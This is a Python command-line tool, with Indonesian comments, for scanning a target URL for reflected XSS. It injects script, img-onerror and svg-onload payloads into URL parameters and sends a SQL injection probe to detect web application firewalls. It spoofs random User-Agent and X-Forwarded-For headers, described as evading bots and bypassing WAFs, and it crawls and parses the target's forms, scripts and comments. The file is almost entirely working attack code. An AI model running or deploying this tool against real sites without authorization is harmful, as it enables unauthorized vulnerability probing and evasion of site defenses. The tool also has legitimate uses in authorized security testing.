#!/usr/bin/env python3
import time
import argparse
import requests
import re
import sys
import urllib.parse
import random
from cryptography.fernet import Fernet
from rich import print
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()

def beep_robot():
    """
    Mengeluarkan suara beep seperti ketikan robot.
    Pada Windows, menggunakan winsound.Beep.
    Pada platform lain, mencetak karakter BEL.
    """
    if sys.platform.startswith("win"):
        try:
            import winsound
            winsound.Beep(500, 50)  # 500 Hz selama 50 ms
        except ImportError:
            print('\a', end='', flush=True)
    else:
        # Mencetak karakter BEL; tergantung pada terminal untuk menghasilkan suara.
        print('\a', end='', flush=True)

def loading_animation(task_description="Loading...", duration=3):
    """
    Menampilkan animasi loading menggunakan spinner 'bouncingBall'
    dan menghasilkan suara seperti ketikan robot secara periodik.
    """
    with Progress(
        SpinnerColumn(spinner_name="bouncingBall"),
        TextColumn("[progress.description]{task.description}"),
        transient=True
    ) as progress:
        task = progress.add_task(task_description, total=duration)
        start_time = time.time()
        counter = 0
        while not progress.finished:
            elapsed = time.time() - start_time
            progress.update(task, completed=elapsed)
            counter += 1
            # Setiap 5 iterasi, keluarkan suara beep
            if counter % 5 == 0:
                beep_robot()
            time.sleep(0.1)

class XSSScanner:
    def __init__(self, url, payload_mode="s", payload_file=None):
        """
        Inisialisasi scanner dengan URL target, mode payload, dan (opsional) file payload.
        
        Mode payload:
          - "y": mengenkripsi payload (URL parameter akan berisi payload terenkripsi),
          - "n": menambahkan (append) payload ke belakang nilai parameter target,
          - "s": payload default (replace) yang menggantikan nilai parameter.
        """
        self.url = url
        self.payload_mode = payload_mode  # "y", "n", atau "s"
        self.payloads = []
        if payload_file:
            self.load_payloads_from_file(payload_file)
        else:
            # Daftar payload default
            self.payloads = [
                "<script>alert('XSS')</script>",
                "'\"><script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ]
        self.encrypted_payloads = []
        self.encryption_key = None
        self.results = []  # Menyimpan hasil uji (URL, payload, status, keterangan)
        # Inisialisasi session dengan header acak untuk evasi bot
        self.session = requests.Session()
        self.session.headers.update(self.get_random_headers())

    def get_random_headers(self):
        """
        Menghasilkan header acak untuk menghindari pendeteksi bot.
        """
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/115.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, seperti Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/115.0.0.0 Safari/537.36"
        ]
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Forwarded-For": "{}.{}.{}.{}".format(
                random.randint(1, 255),
                random.randint(1, 255),
                random.randint(1, 255),
                random.randint(1, 255)
            ),
            "Referer": self.url
        }
        return headers

    def load_payloads_from_file(self, file_path):
        """
        Memuat payload dari file (satu payload per baris).
        Mendukung berbagai jenis file (misalnya .txt, .py, .sh, .json, dll)
        selama isinya berupa teks. Menggunakan encoding UTF-8 dengan errors="ignore".
        """
        try:
            with open(file_path, 'r', encoding='utf-8', errors="ignore") as f:
                lines = f.readlines()
            self.payloads = [line.strip() for line in lines if line.strip()]
            console.print(f"[cyan][*] Loaded {len(self.payloads)} payloads from file: {file_path}[/cyan]")
        except Exception as e:
            console.print(f"[white][!] Error reading payload file: {e}[/white]")
            sys.exit(1)

    def encrypt_payloads_method(self):
        """
        Mengenkripsi semua payload menggunakan Fernet.
        """
        console.print("[yellow][*] Encrypting payloads...[/yellow]")
        self.encryption_key = Fernet.generate_key()
        cipher_suite = Fernet(self.encryption_key)
        self.encrypted_payloads = [cipher_suite.encrypt(p.encode()).decode() for p in self.payloads]
        console.print("[yellow][*] Payloads encrypted successfully![/yellow]")
        console.print(f"[yellow][!] Encryption Key: {self.encryption_key.decode()}[/yellow]")

    def generate_payloads(self):
        """
        Mengembalikan daftar payload.
        Jika mode payload adalah "y", payload akan dienkripsi;
        jika "n" atau "s", payload default (non-enkripsi) yang digunakan.
        """
        if self.payload_mode == "y":
            self.encrypt_payloads_method()
            return self.encrypted_payloads
        else:
            return self.payloads

    def gather_target_info(self):
        """
        Mengumpulkan informasi tambahan dari target (misalnya status code, header Server, Content-Type, dsb).
        """
        console.print("[cyan][*] Gathering target information...[/cyan]")
        try:
            response = self.session.get(self.url, headers=self.get_random_headers(), timeout=10)
            info = {
                "Status Code": response.status_code,
                "Server": response.headers.get("Server", "Unknown"),
                "Powered-By": response.headers.get("X-Powered-By", "N/A"),
                "Content-Type": response.headers.get("Content-Type", "N/A")
            }
            console.print("[cyan][*] Additional Target Information:[/cyan]")
            for key, value in info.items():
                console.print(f"  • [green]{key}[/green]: {value}")
        except Exception as e:
            console.print(f"[white][!] Error gathering target information: {e}[/white]")

    def detect_waf(self):
        """
        Mendeteksi apakah URL target memiliki WAF.
        Jika terdeteksi, script akan mencoba bypass dengan memperbarui header secara acak,
        dan menampilkan informasi header yang mencurigakan. Proses ini dicoba hingga maksimal 5 kali.
        Setelah itu, informasi tambahan target juga dikumpulkan.
        """
        console.print("[cyan][*] Detecting WAF...[/cyan]")
        waf_keywords = ["cloudflare", "sucuri", "incapsula", "mod_security", "imperva", "f5", "citrix", "akamai", "barracuda", "nsfocus", "edgecast", "firewall"]
        attempt = 1
        waf_detected = False
        while attempt <= 5:
            console.print(f"[yellow][*] WAF detection attempt {attempt}...[/yellow]")
            try:
                test_payload = "' OR '1'='1"
                params = self.parser_url_params()
                test_url = self.inject_payload(params[0], test_payload) if params else self.url
                response = self.session.get(test_url, headers=self.get_random_headers(), timeout=10)
                triggered_headers = {}
                for header, value in response.headers.items():
                    for keyword in waf_keywords:
                        if keyword.lower() in value.lower():
                            triggered_headers[header] = value
                if response.status_code in [403, 406] or triggered_headers:
                    waf_detected = True
                    console.print(f"[yellow][*] WAF detected on attempt {attempt}.[/yellow]")
                    if triggered_headers:
                        console.print("[yellow][*] Detected suspicious headers:[/yellow]")
                        for k, v in triggered_headers.items():
                            console.print(f"  - {k}: {v}")
                    console.print("[yellow][*] Attempting to bypass WAF...[/yellow]")
                    self.bypass_waf()
                else:
                    console.print(f"[green][*] No WAF detected or bypass successful on attempt {attempt}.[/green]")
                    break
            except Exception as e:
                console.print(f"[white][!] Error during WAF detection: {e}[/white]")
            attempt += 1
        if waf_detected:
            console.print("[green][*] WAF bypass appears successful after attempts.[/green]")
        else:
            console.print("[green][*] No WAF detected on target.[/green]")
        self.gather_target_info()

    def bypass_waf(self):
        """
        Mencoba bypass WAF dengan memperbarui header sesi secara acak,
        kemudian menampilkan header baru yang diterapkan.
        """
        new_headers = self.get_random_headers()
        new_headers.update({"Referer": self.url})
        self.session.headers.update(new_headers)
        console.print("[yellow][*] WAF bypass headers applied:[/yellow]")
        for k, v in new_headers.items():
            console.print(f"  - {k}: {v}")

    def crawl(self):
        """
        Crawler: Mengambil halaman target dan mengekstrak semua link (href).
        """
        console.print("[cyan][*] Starting crawler...[/cyan]")
        loading_animation("Crawling URLs...", duration=2)
        try:
            response = self.session.get(self.url, headers=self.get_random_headers(), timeout=10)
            links = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
            console.print("[cyan][*] Links found:[/cyan]")
            for link in links:
                console.print(f" - {link}")
        except Exception as e:
            console.print(f"[white][!] Error during crawling: {e}[/white]")

    def parser_html_forms(self, html):
        """
        Parser 1: Ekstrak elemen <form> HTML.
        """
        forms = re.findall(r'(?i)<form.*?</form>', html, re.DOTALL)
        console.print(f"[cyan][*] HTML Forms found: {len(forms)}[/cyan]")
        return forms

    def parser_js_scripts(self, html):
        """
        Parser 2: Ekstrak blok JavaScript inline.
        """
        scripts = re.findall(r'(?i)<script.*?>(.*?)</script>', html, re.DOTALL)
        console.print(f"[cyan][*] Inline JavaScript blocks found: {len(scripts)}[/cyan]")
        return scripts

    def parser_url_params(self):
        """
        Parser 3: Ekstrak parameter dari URL.
        """
        parsed_url = urllib.parse.urlparse(self.url)
        query = urllib.parse.parse_qs(parsed_url.query)
        params = list(query.keys())
        console.print(f"[cyan][*] URL parameters found: {params}[/cyan]")
        return params

    def parser_html_comments(self, html):
        """
        Parser 4: Ekstrak komentar HTML.
        """
        comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
        console.print(f"[cyan][*] HTML Comments found: {len(comments)}[/cyan]")
        return comments

    def run_parsers(self):
        """
        Menjalankan keempat parser pada konten halaman target.
        """
        console.print("[cyan][*] Running parsers on target URL...[/cyan]")
        try:
            response = self.session.get(self.url, headers=self.get_random_headers(), timeout=10)
            html = response.text
            self.parser_html_forms(html)
            self.parser_js_scripts(html)
            self.parser_html_comments(html)
        except Exception as e:
            console.print(f"[white][!] Error during parsing: {e}[/white]")

    def inject_payload(self, param, payload):
        """
        Injeksi payload ke parameter URL sesuai mode:
          - Jika mode "n": payload akan di-append ke nilai parameter yang ada.
          - Jika mode "s" atau "y": payload akan menggantikan nilai parameter.
        """
        parsed_url = urllib.parse.urlparse(self.url)
        query = urllib.parse.parse_qs(parsed_url.query)
        if self.payload_mode == "n":
            original = query.get(param, [""])[0]
            new_value = original + payload
            query[param] = new_value
        elif self.payload_mode in ["s", "y"]:
            query[param] = payload
        else:
            query[param] = payload
        new_query = urllib.parse.urlencode(query, doseq=True)
        new_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        return new_url

    def fuzz(self, payloads):
        """
        Mesin fuzzing: Menguji setiap parameter pada URL dengan setiap payload.
        Jika payload ter-refleksi pada respons, diduga terdapat XSS.
        Hasil uji disimpan dan ditampilkan (URL, payload, status, keterangan).
        """
        console.print("[cyan][*] Starting fuzzing engine...[/cyan]")
        params = self.parser_url_params()
        if not params:
            console.print("[white][!] No URL parameters found for fuzzing.[/white]")
            return
        for param in params:
            for payload in payloads:
                test_url = self.inject_payload(param, payload)
                console.print(f"[cyan][*] Testing URL: {test_url}[/cyan]")
                try:
                    loading_animation("Fuzzing in progress...", duration=1)
                    response = self.session.get(test_url, headers=self.get_random_headers(), timeout=10)
                    if payload in response.text:
                        message = f"Payload reflected: {payload}"
                        console.print(f"[blue][SUCCESS] {test_url} -> {message}[/blue]")
                        self.results.append({
                            "url": test_url,
                            "payload": payload,
                            "status": "Vulnerable",
                            "description": message
                        })
                    else:
                        message = "Payload not reflected."
                        console.print(f"[white][FAIL] {test_url} -> {message}[/white]")
                        self.results.append({
                            "url": test_url,
                            "payload": payload,
                            "status": "Not Vulnerable",
                            "description": message
                        })
                except Exception as e:
                    message = f"Error: {e}"
                    console.print(f"[white][FAIL] {test_url} -> {message}[/white]")
                    self.results.append({
                        "url": test_url,
                        "payload": payload,
                        "status": "Error",
                        "description": message
                    })

    def display_results(self):
        """
        Menampilkan ringkasan hasil uji dalam bentuk tabel.
        """
        console.print("\n[bold green]Summary of Fuzzing Results:[/bold green]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("URL", style="dim", width=50)
        table.add_column("Payload", width=40)
        table.add_column("Status")
        table.add_column("Description", width=40)
        for result in self.results:
            status_color = "blue" if result["status"] == "Vulnerable" else "white"
            table.add_row(
                result["url"],
                result["payload"],
                f"[{status_color}]{result['status']}[/{status_color}]",
                f"[{status_color}]{result['description']}[/{status_color}]"
            )
        console.print(table)

def main():
    parser = argparse.ArgumentParser(
        description="XSStrike-like Advanced XSS Scanner dengan deteksi WAF, bypass otomatis, evasi bot, dan mode payload (y/n/s)"
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL dengan parameter (contoh: http://example.com/?search=test)")
    parser.add_argument("-m", "--payload-mode", choices=["y", "n", "s"], required=True,
                        help=("Mode payload: 'y' untuk mengenkripsi payload, "
                              "'n' untuk menambahkan payload di belakang parameter, "
                              "'s' untuk payload default (replace)"))
    parser.add_argument("-f", "--file", help="Path ke file payload (satu payload per baris, mendukung .txt, .py, .sh, .json, dll)", default=None)
    args = parser.parse_args()

    console.print("[bold green]XSStrike-like Advanced XSS Scanner[/bold green]")
    loading_animation("Initializing tool...", duration=2)

    scanner = XSSScanner(url=args.url, payload_mode=args.payload_mode, payload_file=args.file)
    scanner.detect_waf()
    scanner.crawl()
    scanner.run_parsers()
    payloads = scanner.generate_payloads()
    scanner.fuzz(payloads)
    scanner.display_results()

if __name__ == "__main__":
    main()
